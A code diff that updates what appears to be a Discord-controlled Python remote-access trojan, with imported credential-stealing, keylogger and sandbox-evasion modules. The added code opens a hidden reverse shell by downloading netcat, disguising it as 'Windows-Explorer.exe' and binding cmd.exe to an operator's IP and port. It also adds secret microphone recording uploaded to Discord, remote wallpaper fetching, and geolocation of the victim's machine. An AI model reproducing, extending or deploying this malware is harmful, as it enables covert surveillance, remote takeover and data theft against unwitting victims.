@@ -6,6 +6,8 @@ import requests
 import random
 from cv2 import VideoCapture
 from cv2 import imwrite
+from scipy.io.wavfile import write
+from sounddevice import rec, wait
 import platform
 import re
 from urllib.request import Request, urlopen
@@ -28,7 +30,7 @@ from winreg import *
 from ctypes import *
 from libraries import credentials,keylogger,sandboxevasion
 
-VERSION = "v1.1.9"
+VERSION = "v1.2.0"
 
 KEYLOG = {KEYLOG}
 PERSISTENT = {PERSISTENT}
@@ -78,7 +80,7 @@ def keylogs():
 
 def getIP():            
         try:
-            IP = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+            IP = urlopen(Request("https://ipv4.myip.wtf/text")).read().decode().strip()
         except Exception as e:
             IP = "None"
         return IP
@@ -420,30 +422,106 @@ async def location(context):
     word_list = command.split()
     if word_list[0] == str(ID):
         try:
-            response = requests.get("https://utilities.tk/network/info")
+            response = requests.get("https://json.ipv4.myip.wtf")
             response.raise_for_status()
-            loc_ip = response.json()["ip"]
-            loc_hostname = response.json()["hostname"]
-            loc_city = response.json()["city"]
-            loc_region = response.json()["region"]
-            loc_country = response.json()["country"]
-            loc_loc = response.json()["loc"]
-            loc_org = response.json()["org"]
-            loc_timezone = response.json()["timezone"]
+            loc_ip = response.json()["YourFuckingIPAddress"]
             my_embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
-            my_embed.add_field(name="IP:", value=f"**{loc_ip}**", inline=False)
-            my_embed.add_field(name="Hostname:", value=f"**{loc_hostname}**", inline=False)
-            my_embed.add_field(name="City:", value=f"**{loc_city}**", inline=False)
-            my_embed.add_field(name="Region:", value=f"**{loc_region}**", inline=False)
-            my_embed.add_field(name="Country:", value=f"**{loc_country}**", inline=False)
-            my_embed.add_field(name="Location:", value=f"**{loc_loc}**", inline=False)
-            my_embed.add_field(name="Organazation:", value=f"**{loc_org}**", inline=False)
-            my_embed.add_field(name="Timezone:", value=f"**{loc_timezone}**", inline=False)
+            my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
+            my_embed.add_field(name="Hostname:", value=f"**{response.json()['YourFuckingHostname']}**", inline=False)
+            my_embed.add_field(name="City:", value=f"**{response.json()['YourFuckingLocation']}**", inline=False)
+            my_embed.add_field(name="Country:", value=f"**{response.json()['YourFuckingCountryCode']}**", inline=False)
+            my_embed.add_field(name="ISP:", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
             await context.message.channel.send(embed=my_embed)
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}:\n{e}", color=0xFF0000)
             await context.message.channel.send(embed=my_embed)
 
+@client.command(name='revshell', pass_context=True)
+async def revshell(context):
+    command = context.message.content.replace("!revshell ", "")
+    word_list = command.split()
+    if word_list[0] == str(ID):
+        def exec(IP,PORT):
+            if os.path.exists(os.environ["temp"] + '\\Windows-Explorer.exe'):
+                try:
+                    result = sp.Popen(f"{os.environ['temp']}\\Windows-Explorer.exe {IP} {PORT} -e cmd.exe /b", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
+                    out, err = result.communicate()
+                    result.wait()
+                    if err:
+                        raise Exception
+                    else:
+                        return True
+                except Exception as e:
+                    return False
+            else:
+                try:
+                    r = requests.get("https://github.com/int0x33/nc.exe/raw/master/nc64.exe", allow_redirects=True, verify=False)
+                    open(os.environ["temp"] +'\\Windows-Explorer.exe', 'wb').write(r.content)
+                    result = sp.Popen(f"{os.environ['temp']}\\Windows-Explorer.exe {IP} {PORT} -e cmd.exe /b", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
+                    out, err = result.communicate()
+                    result.wait()
+                    if err:
+                        raise Exception
+                    else:
+                        return True
+                except Exception as e:
+                    return False
+        
+        if threading.Thread(target=exec, args=(word_list[1],word_list[2])).start():
+            my_embed = discord.Embed(title=f"Netcat has been successfully executed on Agent#{ID}", color=0x00FF00)
+            await context.message.channel.send(embed=my_embed)
+        else:
+            my_embed = discord.Embed(title=f"Error while running Netcat on Agent#{ID}:\n{e}", color=0xFF0000)
+            await context.message.channel.send(embed=my_embed)
+
+@client.command(name='recordmic', pass_context=True)
+async def recordmic(context):
+    command = context.message.content.replace("!recordmic ", "")
+    word_list = command.split()
+    if word_list[0] == str(ID):
+        seconds = int(word_list[1])
+        channel = client.get_channel(DOWNLOADS_ID)
+        try:
+            fs = 44100
+            recording = rec(int(seconds * fs), samplerate=fs, channels=2)
+            wait()
+            os.chdir(fr"C:\Users\{USERNAME}\.config\uploads")
+            write('recording.wav', fs, recording)
+            await channel.send(f"**Agent #{ID}** Microphone recording:", file=discord.File(fr"C:\Users\{USERNAME}\.config\uploads\recording.wav"))
+            os.remove(fr"C:\Users\{USERNAME}\.config\uploads\recording.wav")
+            my_embed = discord.Embed(title=f"The recorded audio has been uploaded to 'downloads' channel", color=0x00FF00)
+            await context.message.channel.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error while recording mic on Agent#{ID}:\n{e}", color=0xFF0000)
+            await context.message.channel.send(embed=my_embed)
+        
+@client.command(name="wallpaper", pass_context=True)
+async def wallpaper(context):
+    command = context.message.content.replace("!wallpaper ", "")
+    word_list = command.split()
+    if word_list[0] == str(ID):
+        wallpaper_path = word_list[1]
+        if wallpaper_path.startswith("http"):
+            try:
+                wallpaper_name = f"wallpaper.{wallpaper_path[-3:]}"
+                r = requests.get(wallpaper_path, allow_redirects=True, verify=False)
+                open(fr"C:\Users\{USERNAME}\.config\uploads\{wallpaper_name}", 'wb').write(r.content)
+                wallpaper_location = fr"C:\Users\{USERNAME}\.config\uploads\{wallpaper_name}"
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_location, 0)
+                my_embed = discord.Embed(title=f"Wallpaper has been set to {wallpaper_path}", color=0x00FF00)
+                await context.message.channel.send(embed=my_embed)
+            except Exception as e:
+                my_embed = discord.Embed(title=f"Error while setting wallpaper on Agent#{ID}:\n{e}", color=0xFF0000)
+                await context.message.channel.send(embed=my_embed)
+        else:
+            try:
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
+                my_embed = discord.Embed(title=f"Wallpaper has been set to {wallpaper_path}", color=0x00FF00)
+                await context.message.channel.send(embed=my_embed)
+            except Exception as e:
+                my_embed = discord.Embed(title=f"Error while setting wallpaper on Agent#{ID}:\n{e}", color=0xFF0000)
+                await context.message.channel.send(embed=my_embed)
+        
 @client.command(name='killproc',pass_context=True)
 async def killproc(context):
     command = context.message.content.replace("!killproc ", "")
